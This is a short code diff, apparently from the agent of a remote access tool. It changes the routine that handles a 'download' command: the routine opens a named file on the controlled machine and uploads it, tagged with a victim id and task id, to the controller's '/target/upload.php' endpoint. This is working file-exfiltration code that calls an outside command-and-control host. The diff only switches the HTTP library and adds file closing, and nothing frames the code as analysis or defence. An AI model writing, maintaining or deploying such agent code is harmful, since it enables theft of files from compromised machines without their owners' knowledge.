@@ -120,11 +120,13 @@ while 1:
 				filename = command.replace ('download ', '')
 
 				if os.path.isfile(filename):
-					files = {'file_to_upload': open(filename,'rb')}
-
-					# Start the download without blocking the process
-					r = grequests.post(caesar_folder + '/target/upload.php', data={'unique_id': unique_id, 'command': command, 'task_id': task_id}, files=files)
-					job = grequests.send(r, grequests.Pool(1))
+					url = caesar_folder + '/target/upload.php'
+					fin = open(filename, 'rb')
+					files = {'file_to_upload': fin}
+					try:
+					  	r = requests.post(url, data={'unique_id': unique_id, 'command': command, 'task_id': task_id}, files=files)
+					finally:
+						fin.close()
 
 					output = 'The file is being uploaded to the server'
 
